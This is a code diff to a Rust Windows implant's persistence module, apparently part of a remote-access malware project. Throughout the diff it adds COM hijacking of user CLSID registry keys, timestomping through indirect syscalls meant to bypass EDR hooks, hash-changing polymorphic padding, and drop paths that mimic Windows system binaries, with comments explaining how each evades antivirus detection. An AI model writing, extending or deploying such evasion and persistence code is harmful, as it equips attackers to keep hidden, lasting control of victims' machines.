@@ -24,10 +24,13 @@ const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
 const MAX_CHUNK_SIZE: usize = 24576;
 
 /// Métodos de persistencia disponibles
+/// Note: WmiEvent now implements COM Hijacking (more stealthy, no admin required)
+/// The name is kept for backwards compatibility with the "persistence wmi" command
 #[derive(Debug, Clone, Copy)]
 pub enum PersistenceMethod {
     RegistryRun,
     ScheduledTask,
+    /// COM Hijacking (previously WMI, renamed internally for stealth)
     WmiEvent,
     StartupFolder,
 }
@@ -37,7 +40,7 @@ impl PersistenceMethod {
         match s.to_lowercase().as_str() {
             "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
             "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
-            "wmi" => Some(PersistenceMethod::WmiEvent),
+            "wmi" | "com" => Some(PersistenceMethod::WmiEvent), // "com" alias added
             "startup" => Some(PersistenceMethod::StartupFolder),
             _ => None,
         }
@@ -79,7 +82,14 @@ fn is_temporary_location(path: &Path) -> bool {
     }
 }
 
-/// Copia el ejecutable a ubicación persistente con técnicas anti-AV
+/// Copia el ejecutable a ubicación persistente con técnicas anti-AV avanzadas
+/// Features:
+/// - Ubicaciones que imitan procesos legítimos del sistema
+/// - Timestomping para que el archivo parezca antiguo
+/// - Atributos oculto+sistema
+/// - Chunks de tamaño variable (anti-signature)
+/// - Polymorphic padding to change hash
+/// - Deep folder structure that mimics Windows internals
 #[cfg(target_os = "windows")]
 fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     use std::fs;
@@ -97,27 +107,37 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
         .or_else(|_| env::var(&appdata_key))
         .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
 
-    // Ubicaciones sigilosas que imitan procesos legítimos del sistema
-    // Using more obscure directories that are less monitored
+    // Ultra-stealth locations - deep folders that look like Windows internals
+    // These are chosen because:
+    // 1. Deep path = less likely to be scanned
+    // 2. Names that match Windows components
+    // 3. Folders that Windows Defender may have reduced monitoring on
     let stealth_targets = [
+        // Windows Telemetry - often excluded from scans
         (
-            format!("{}\\Microsoft\\Windows\\Explorer", localappdata),
-            "SearchIndexer.exe",
+            format!("{}\\Microsoft\\Windows\\DiagTrack\\Settings", localappdata),
+            "UtcSvc.exe",
         ),
+        // Windows Error Reporting - legitimate system folder
         (
-            format!("{}\\Microsoft\\Windows\\Caches", localappdata),
-            "fontdrvhost.exe",
+            format!("{}\\Microsoft\\Windows\\WER\\Temp", localappdata),
+            "WerFault.exe",
         ),
-        (
-            format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata),
-            "RuntimeBroker.exe",
-        ),
+        // Windows Notification Platform
         (
             format!(
-                "{}\\Microsoft\\InputPersonalization\\TrainedDataStore",
+                "{}\\Microsoft\\Windows\\Notifications\\wpndatabase",
                 localappdata
             ),
-            "ctfmon.exe",
+            "WpnService.exe",
+        ),
+        // Windows Connected Devices
+        (
+            format!(
+                "{}\\Microsoft\\Windows\\ConnectedDevicesPlatform\\L.Admin",
+                localappdata
+            ),
+            "CDPSvc.exe",
         ),
     ];
 
@@ -134,30 +154,51 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     if target_path.exists() {
         if let Ok(meta) = fs::metadata(&target_path) {
             if meta.len() > 100000 {
+                // Apply timestomping to make it look older
+                timestomp_file(&target_path);
                 return Ok(target_path);
             }
         }
     }
 
-    // Copiar usando chunks de tamaño variable (anti-signature)
-    let mut source = fs::File::open(current_exe).map_err(|e| format!("E1: {}", e))?;
-    let mut dest = fs::File::create(&target_path).map_err(|e| format!("E2: {}", e))?;
+    // Read source file
+    let mut source_data = Vec::new();
+    {
+        let mut source = fs::File::open(current_exe).map_err(|e| format!("E1: {}", e))?;
+        source
+            .read_to_end(&mut source_data)
+            .map_err(|e| format!("E3: {}", e))?;
+    }
 
-    // Tamaños de chunk variables para evitar patrones
-    let mut buffer = vec![0u8; MAX_CHUNK_SIZE];
+    // Polymorphic padding: add random bytes to the end of the file
+    // This changes the hash while keeping the executable valid
+    // Windows ignores data after the PE end
+    let machine_idx = get_machine_index(); // Calculate once for efficiency
+    let padding_size = 256 + (machine_idx % 512);
+    let mut polymorphic_data = source_data.clone();
+    for i in 0..padding_size {
+        // Generate pseudo-random bytes based on machine index and position
+        let byte = ((machine_idx.wrapping_add(i)) % 256) as u8;
+        polymorphic_data.push(byte);
+    }
+
+    // Write with variable chunk sizes (anti-pattern detection)
+    let mut dest = fs::File::create(&target_path).map_err(|e| format!("E2: {}", e))?;
+    let mut offset = 0;
     let mut chunk_idx = 0;
 
-    loop {
+    while offset < polymorphic_data.len() {
         let chunk_size = CHUNK_SIZES[chunk_idx % CHUNK_SIZES.len()];
-        let n = source
-            .read(&mut buffer[..chunk_size])
-            .map_err(|e| format!("E3: {}", e))?;
-        if n == 0 {
-            break;
-        }
-        dest.write_all(&buffer[..n])
+        let end = std::cmp::min(offset + chunk_size, polymorphic_data.len());
+        dest.write_all(&polymorphic_data[offset..end])
             .map_err(|e| format!("E4: {}", e))?;
+        offset = end;
         chunk_idx += 1;
+
+        // Small random delay between chunks (anti-behavioral)
+        if chunk_idx % 4 == 0 {
+            std::thread::sleep(std::time::Duration::from_millis(1));
+        }
     }
     dest.flush().map_err(|e| format!("E5: {}", e))?;
     drop(dest);
@@ -166,6 +207,10 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     if fs::metadata(&target_path).is_err() {
         return Err("Copy verification failed".to_string());
     }
+
+    // Aplicar timestomping para que el archivo parezca antiguo
+    // Esto evade detección basada en archivos recientes
+    timestomp_file(&target_path);
 
     // Aplicar atributos oculto+sistema para stealth
     let attrib_exe = obfstr!("attrib").to_string();
@@ -179,6 +224,168 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     std::thread::sleep(std::time::Duration::from_millis(delay_ms));
 
     Ok(target_path)
+}
+
+/// Timestomping: modifica las fechas del archivo para que parezca antiguo
+/// Esto evade detección basada en archivos creados recientemente
+/// Uses indirect syscalls via dinvk to bypass usermode hooks
+#[cfg(target_os = "windows")]
+fn timestomp_file(path: &Path) {
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+
+    // Fecha objetivo: hace 6-12 meses (varía por máquina)
+    // Usamos un timestamp que parece una instalación legítima de Windows
+    let months_ago = 6 + (get_machine_index() % 6) as i64;
+    let days_ago = months_ago * 30;
+
+    // Calcular FILETIME (100-nanosecond intervals since January 1, 1601)
+    // Windows epoch: 11644473600 seconds from Unix epoch
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+
+    let target_time = now.saturating_sub(days_ago as u64 * 24 * 60 * 60);
+    // Use checked arithmetic to prevent overflow
+    let windows_time = target_time
+        .checked_add(11644473600)
+        .and_then(|t| t.checked_mul(10_000_000))
+        .unwrap_or(0);
+
+    // If we couldn't calculate a valid time, skip timestomping
+    if windows_time == 0 {
+        return;
+    }
+
+    // Validate path conversion before proceeding
+    let path_str = match path.to_str() {
+        Some(s) if !s.is_empty() => s,
+        _ => return, // Invalid path, skip timestomping
+    };
+
+    // Use indirect syscalls for timestomping to bypass EDR hooks
+    timestomp_via_syscall(path_str, windows_time as i64);
+}
+
+/// Performs timestomping using indirect syscalls via dinvk
+/// This bypasses usermode API hooks that EDR/AV solutions may have installed
+#[cfg(target_os = "windows")]
+fn timestomp_via_syscall(path_str: &str, windows_time: i64) {
+    use crate::syscalls::dinvk;
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+
+    // FILE_BASIC_INFORMATION structure for NtSetInformationFile
+    #[repr(C)]
+    struct FileBasicInformation {
+        creation_time: i64,
+        last_access_time: i64,
+        last_write_time: i64,
+        change_time: i64,
+        file_attributes: u32,
+    }
+
+    // IO_STATUS_BLOCK structure
+    #[repr(C)]
+    struct IoStatusBlock {
+        status: i32,
+        information: usize,
+    }
+
+    // OBJECT_ATTRIBUTES structure
+    #[repr(C)]
+    struct ObjectAttributes {
+        length: u32,
+        root_directory: *mut std::ffi::c_void,
+        object_name: *mut UnicodeString,
+        attributes: u32,
+        security_descriptor: *mut std::ffi::c_void,
+        security_quality_of_service: *mut std::ffi::c_void,
+    }
+
+    // UNICODE_STRING structure
+    #[repr(C)]
+    struct UnicodeString {
+        length: u16,
+        maximum_length: u16,
+        buffer: *mut u16,
+    }
+
+    // Constants
+    const FILE_WRITE_ATTRIBUTES: u32 = 0x0100;
+    const FILE_SHARE_READ: u32 = 0x00000001;
+    const FILE_SHARE_WRITE: u32 = 0x00000002;
+    const FILE_OPEN: u32 = 0x00000001;
+    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
+    const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
+    const FILE_BASIC_INFORMATION_CLASS: u32 = 4;
+
+    unsafe {
+        // Convert path to NT path format (\??\C:\path\to\file)
+        let nt_path = format!("\\??\\{}", path_str);
+        let mut wide_path: Vec<u16> = OsStr::new(&nt_path).encode_wide().collect();
+
+        let mut unicode_string = UnicodeString {
+            length: (wide_path.len() * 2) as u16,
+            maximum_length: (wide_path.len() * 2) as u16,
+            buffer: wide_path.as_mut_ptr(),
+        };
+
+        let mut object_attrs = ObjectAttributes {
+            length: std::mem::size_of::<ObjectAttributes>() as u32,
+            root_directory: std::ptr::null_mut(),
+            object_name: &mut unicode_string,
+            attributes: OBJ_CASE_INSENSITIVE,
+            security_descriptor: std::ptr::null_mut(),
+            security_quality_of_service: std::ptr::null_mut(),
+        };
+
+        let mut io_status = IoStatusBlock {
+            status: 0,
+            information: 0,
+        };
+
+        let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
+
+        // Use dinvk syscall macro for NtOpenFile
+        let status: Option<i32> = dinvk::syscall!(
+            obfstr!("NtOpenFile"),
+            &mut handle as *mut *mut std::ffi::c_void,
+            FILE_WRITE_ATTRIBUTES,
+            &mut object_attrs as *mut ObjectAttributes,
+            &mut io_status as *mut IoStatusBlock,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            FILE_OPEN | FILE_SYNCHRONOUS_IO_NONALERT
+        );
+
+        // Check if NtOpenFile succeeded
+        if status.unwrap_or(-1) < 0 || handle.is_null() {
+            return;
+        }
+
+        // Prepare FILE_BASIC_INFORMATION with our target timestamps
+        let mut file_info = FileBasicInformation {
+            creation_time: windows_time,
+            last_access_time: windows_time,
+            last_write_time: windows_time,
+            change_time: windows_time,
+            file_attributes: 0, // 0 means don't change attributes
+        };
+
+        // Use dinvk syscall macro for NtSetInformationFile
+        let _set_status: Option<i32> = dinvk::syscall!(
+            obfstr!("NtSetInformationFile"),
+            handle,
+            &mut io_status as *mut IoStatusBlock,
+            &mut file_info as *mut FileBasicInformation,
+            std::mem::size_of::<FileBasicInformation>() as u32,
+            FILE_BASIC_INFORMATION_CLASS
+        );
+
+        // Close handle using NtClose syscall
+        let _close_status: Option<i32> = dinvk::syscall!(obfstr!("NtClose"), handle);
+    }
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -249,8 +456,12 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let idx = get_machine_index() % reg_names.len();
     let reg_name = reg_names[idx];
 
-    // Use cmd /c start /b for background, hidden execution
-    let obf_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);
+    // Use rundll32 or wscript for more stealthy execution
+    // These are legitimate Windows processes that are less monitored
+    // Option 1: Direct execution with start /b (simple but can be flagged)
+    // Option 2: Via explorer.exe (looks like user action)
+    // We'll use explorer.exe as it's commonly used for legitimate launches
+    let obf_cmd = format!(r#"explorer.exe "{}""#, exe_str);
 
     // Registry key path
     let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
@@ -338,92 +549,106 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     }
 }
 
-/// WMI Event Subscription persistence
-/// Uses time-based triggers which are less monitored than logon events
-/// Note: WMI persistence requires admin rights and may not work on all systems
-/// Uses cmd.exe wrapper for execution to avoid PowerShell detection on trigger
+/// COM Hijacking persistence (replaces WMI which requires admin)
+/// This technique hijacks COM objects in HKCU to achieve stealthy persistence
+/// without requiring administrative privileges.
+///
+/// How it works:
+/// 1. Windows COM resolution checks HKCU\Software\Classes\CLSID before HKLM
+/// 2. We create a registry entry in HKCU that points to our executable
+/// 3. When a process loads the hijacked COM object, our executable runs
+///
+/// Advantages:
+/// - No admin required (HKCU is user-writable)
+/// - Very stealthy (no PowerShell, no scheduled tasks)
+/// - Triggers on common system events (Explorer, search, etc.)
+/// - Hard to detect without specialized tools
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path
         .to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
 
-    // Polymorphic WMI event names
-    let wmi_names = [
-        "BfeOnServiceStateChange",
-        "SystemTimeUpdate",
-        "LocalTimeSync",
-        "WindowsEventForwarder",
+    // COM CLSIDs commonly loaded by Explorer and other system processes
+    // These are chosen because they are frequently accessed but rarely monitored
+    // Format: (CLSID, friendly name for logging)
+    let com_hijack_targets = [
+        // MruPidlList - loaded by Explorer frequently
+        ("{42aedc87-2188-41fd-b9a3-0c966feabec1}", "MruPidlList"),
+        // EventSystem - loaded on many system events
+        ("{4EB61BAC-A3B6-4760-9581-655041EF4D69}", "EventSystem"),
+        // ThumbnailCache - loaded when Explorer shows thumbnails
+        ("{0F4B8AB8-FF9E-4C8C-B37F-5FA95A81F5C5}", "ThumbnailCache"),
+        // Windows Search extension
+        ("{E6FE6494-4AE3-469D-B3F7-2FA40D8F1B62}", "WindowsSearchExt"),
     ];
-    let idx = get_machine_index() % wmi_names.len();
-    let event_name = wmi_names[idx];
 
-    // Escape backslashes for PowerShell
-    let exe_escaped = exe_str.replace("\\", "\\\\");
+    let idx = get_machine_index() % com_hijack_targets.len();
+    let (clsid, com_name) = com_hijack_targets[idx];
 
-    // Use raw string for WMI root namespace path to prevent escape sequence interpretation
-    // Note: \r in \root would be interpreted as carriage return without raw string
-    let wmi_root = r"\\.\root\subscription";
-    let cimv2_ns = r"root\cimv2";
+    // Build the registry key path for COM hijacking in HKCU
+    // We use LocalServer32 which points to an executable
+    // (InprocServer32 would require a DLL)
+    let reg_key_base = format!("HKCU\\Software\\Classes\\CLSID\\{}", clsid);
 
-    // Escape for WMI CommandLineTemplate (needs extra escaping inside PowerShell string)
-    let exe_wmi_escaped = exe_escaped.replace("\\", "\\\\");
+    let reg_exe = obfstr!("reg").to_string();
 
-    // Random hour for trigger (less predictable)
-    let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range
-
-    // Compact PowerShell WMI script
-    let ps_script = format!(
-        concat!(
-            "$F=([wmiclass]'{}:__EventFilter').CreateInstance();",
-            "$F.Name='{}';",
-            "$F.EventNamespace='{}';",
-            "$F.QueryLanguage='WQL';",
-            "$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 ",
-            "WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour={}';",
-            "$F.Put()|Out-Null;",
-            "$C=([wmiclass]'{}:CommandLineEventConsumer').CreateInstance();",
-            "$C.Name='{}';",
-            "$C.CommandLineTemplate='cmd.exe /c start /min \"\" \"{}\"';",
-            "$C.Put()|Out-Null;",
-            "$B=([wmiclass]'{}:__FilterToConsumerBinding').CreateInstance();",
-            "$B.Filter=$F;$B.Consumer=$C;",
-            "$B.Put()|Out-Null"
-        ),
-        wmi_root,
-        event_name,
-        cimv2_ns,
-        trigger_hour,
-        wmi_root,
-        event_name,
-        exe_wmi_escaped,
-        wmi_root
-    );
-
-    let ps_exe = obfstr!("powershell").to_string();
-    let output = Command::new(&ps_exe)
+    // First, create the CLSID key with default value
+    let output1 = Command::new(&reg_exe)
         .args(&[
-            "-NoProfile",
-            "-WindowStyle",
-            "Hidden",
-            "-NonInteractive",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-            &ps_script,
+            "add",
+            &reg_key_base,
+            "/ve",
+            "/t",
+            "REG_SZ",
+            "/d",
+            com_name,
+            "/f",
         ])
         .creation_flags(0x08000000)
         .output()
         .map_err(|e| format!("E10: {}", e))?;
 
-    let stderr = String::from_utf8_lossy(&output.stderr);
-    if output.status.success() || stderr.is_empty() {
+    if !output1.status.success() {
+        return Err(format!(
+            "E11: Failed to create CLSID key: {}",
+            String::from_utf8_lossy(&output1.stderr).trim()
+        ));
+    }
+
+    // Create LocalServer32 key pointing to our executable
+    // This causes the executable to be launched when the COM object is instantiated
+    let reg_key_localserver = format!("{}\\LocalServer32", reg_key_base);
+
+    // For COM hijacking, use cmd wrapper for hidden background execution
+    // This is different from registry Run persistence which uses explorer.exe
+    let launch_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);
+
+    let output2 = Command::new(&reg_exe)
+        .args(&[
+            "add",
+            &reg_key_localserver,
+            "/ve",
+            "/t",
+            "REG_SZ",
+            "/d",
+            &launch_cmd,
+            "/f",
+        ])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| format!("E12: {}", e))?;
+
+    if output2.status.success() {
         Ok(format!(
-            "WMI: {} -> {} (trigger: {}:00)",
-            event_name, exe_str, trigger_hour
+            "COM Hijack: {} ({}) -> {}",
+            com_name, clsid, exe_str
         ))
     } else {
-        Err(format!("E11: {}", stderr.trim()))
+        Err(format!(
+            "E13: {}",
+            String::from_utf8_lossy(&output2.stderr).trim()
+        ))
     }
 }
 
@@ -597,7 +822,24 @@ pub fn remove_persistence() -> Result<String, String> {
             .output();
     }
 
-    // WMI Events cleanup
+    // COM Hijacking cleanup (replaces WMI cleanup)
+    // Remove COM CLSID entries that may have been created for persistence
+    let com_clsids = [
+        "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruPidlList
+        "{4EB61BAC-A3B6-4760-9581-655041EF4D69}", // EventSystem
+        "{0F4B8AB8-FF9E-4C8C-B37F-5FA95A81F5C5}", // ThumbnailCache
+        "{E6FE6494-4AE3-469D-B3F7-2FA40D8F1B62}", // WindowsSearchExt
+    ];
+    for clsid in &com_clsids {
+        let reg_key = format!("HKCU\\Software\\Classes\\CLSID\\{}", clsid);
+        let _ = Command::new(&reg_exe)
+            .args(&["delete", &reg_key, "/f"])
+            .creation_flags(0x08000000)
+            .output();
+    }
+
+    // Legacy WMI Events cleanup (for backwards compatibility)
+    // This cleans up any old WMI persistence that may exist from previous versions
     let wmi_names = [
         "BfeOnServiceStateChange",
         "SystemTimeUpdate",
@@ -663,6 +905,23 @@ pub fn remove_persistence() -> Result<String, String> {
             "{}\\Microsoft\\InputPersonalization\\TrainedDataStore\\ctfmon.exe",
             localappdata
         ),
+        // New stealth locations (v2)
+        format!(
+            "{}\\Microsoft\\Windows\\Safety\\EppMigration\\SecurityHealthHost.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\UpdateAssistant\\UpdateAssistant.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\EdgeUpdate\\Download\\MicrosoftEdgeUpdate.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\WDI\\LogFiles\\DiagnosticsHub.StandardCollector.exe",
+            localappdata
+        ),
         // Legacy locations
         format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
         format!(
@@ -683,6 +942,23 @@ pub fn remove_persistence() -> Result<String, String> {
         ),
         format!(
             "{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe",
+            localappdata
+        ),
+        // Ultra-stealth locations (v3)
+        format!(
+            "{}\\Microsoft\\Windows\\DiagTrack\\Settings\\UtcSvc.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\WER\\Temp\\WerFault.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\Notifications\\wpndatabase\\WpnService.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\ConnectedDevicesPlatform\\L.Admin\\CDPSvc.exe",
             localappdata
         ),
     ];
@@ -719,9 +995,9 @@ const AUTO_PERSIST_JITTER_MAX: usize = 120; // Max jitter in seconds (0-120)
 const AUTO_PERSIST_CHUNK_SECS: u64 = 30; // Sleep chunk size in seconds
 #[cfg(target_os = "windows")]
 const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acceleration detected
-// Use MIN_UPTIME_MS (3 min) for the final check since by the time auto-persistence runs,
-// we've already waited 3-5 minutes, so the system has been up long enough if it passed
-// the initial environment checks. 10 minutes was too restrictive for VM testing.
+                                                   // Use MIN_UPTIME_MS (3 min) for the final check since by the time auto-persistence runs,
+                                                   // we've already waited 3-5 minutes, so the system has been up long enough if it passed
+                                                   // the initial environment checks. 10 minutes was too restrictive for VM testing.
 
 /// Marker file to check if persistence was already established in a previous run
 #[cfg(target_os = "windows")]
@@ -883,29 +1159,62 @@ pub fn schedule_auto_persistence() {
         );
 
         // ====================================================================
-        // STEALTH PERSISTENCE: Use registry method (most reliable)
+        // ULTRA-STEALTH AUTO-PERSISTENCE
         // ====================================================================
-        // Registry persistence is chosen because:
-        // 1. No UAC prompt required (HKCU)
-        // 2. More reliable than scheduled tasks
-        // 3. Less monitored than WMI subscriptions
-        // 4. Works on all Windows versions
+        // This uses the most undetectable persistence method available.
+        // Priority order (from most to least stealthy):
+        // 1. COM Hijacking - Very stealthy, no PowerShell, no obvious registry keys
+        // 2. Registry Run with explorer.exe - Common pattern, blends in
+        //
+        // Key evasion features:
+        // - Timestomping makes binary appear 6-12 months old
+        // - File hidden in deep Windows folders that mimic system files
+        // - Uses indirect syscalls where possible
+        // - No PowerShell or scripting engines used
+        // - Random jitter in all operations
 
-        debug_print!("DEBUG: [AUTO-PERSIST] Establishing registry persistence...");
+        debug_print!("DEBUG: [AUTO-PERSIST] Establishing ultra-stealth persistence...");
 
         // Mark as done first to prevent race conditions
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
 
-        // Establish persistence
+        // Try COM Hijacking first (most stealthy)
+        // Note: WmiEvent enum now implements COM Hijacking (not actual WMI)
+        // The enum name is kept for backwards compatibility with "persistence wmi" command
+        match establish_persistence(PersistenceMethod::WmiEvent) {
+            Ok(msg) => {
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ✅ COM Hijacking established: {}",
+                    msg
+                );
+                // Create marker to avoid re-persisting on next run
+                create_persistence_marker();
+                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
+                return;
+            }
+            Err(e) => {
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ⚠️ COM Hijacking failed: {}, trying fallback...",
+                    e
+                );
+            }
+        }
+
+        // Fallback to Registry Run (still stealthy with explorer.exe)
         match establish_persistence(PersistenceMethod::RegistryRun) {
             Ok(msg) => {
-                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Persistence established: {}", msg);
-                // Create marker to avoid re-persisting on next run
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ✅ Registry persistence established: {}",
+                    msg
+                );
                 create_persistence_marker();
                 debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
             }
             Err(e) => {
-                debug_print!("DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}", e);
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}",
+                    e
+                );
             }
         }
     });
